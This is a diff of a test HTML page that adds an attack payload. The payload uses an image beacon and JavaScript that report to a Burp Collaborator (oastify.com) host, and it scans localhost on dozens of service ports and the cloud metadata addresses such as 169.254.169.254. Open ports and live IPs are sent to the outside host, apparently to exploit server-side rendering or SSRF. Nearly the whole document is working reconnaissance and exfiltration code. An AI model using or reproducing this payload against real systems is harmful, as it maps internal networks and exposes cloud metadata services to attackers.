@@ -9,7 +9,33 @@
     This website is for testing
   <img src="https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?ItsRenderingHtml"/>
 <script>
-fetch('https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?JavacriptIsExcuted=');
+    const burp_collaborator = "https://yvx5gs2f7y44hrlt8rgfzpi9w02rqhe6.oastify.com";
+
+// Notify Burp that JavaScript was executed
+fetch(`${burp_collaborator}?JavascriptIsExecuted=True`);
+
+// Internal IPs and Ports
+const ips = ["169.254.169.254", "169.254.170.2", "168.63.129.16"];
+const ports = [
+  22, 80, 443, 2375, 2376, 8080, 8000, 8888, 27017, 3306, 5432, 6379, 5000,
+  9090, 9200, 9300, 15672, 3000, 50070, 2049, 389, 5984, 10250, 10255, 8181,
+  16992, 6006
+];
+
+// Scan local ports (e.g., for SSRF or service exposure)
+ports.forEach(port => {
+  fetch(`http://localhost:${port}`, { mode: "no-cors" })
+    .then(() => fetch(`${burp_collaborator}/?openPort=${port}`))
+    .catch(() => { });
+});
+
+// Scan internal IPs
+ips.forEach(ip => {
+  fetch(`http://${ip}`, { mode: "no-cors" })
+    .then(() => fetch(`${burp_collaborator}/?liveIP=${ip}`))
+    .catch(() => { });
+});
+
 </script>
 </body>
 </html>
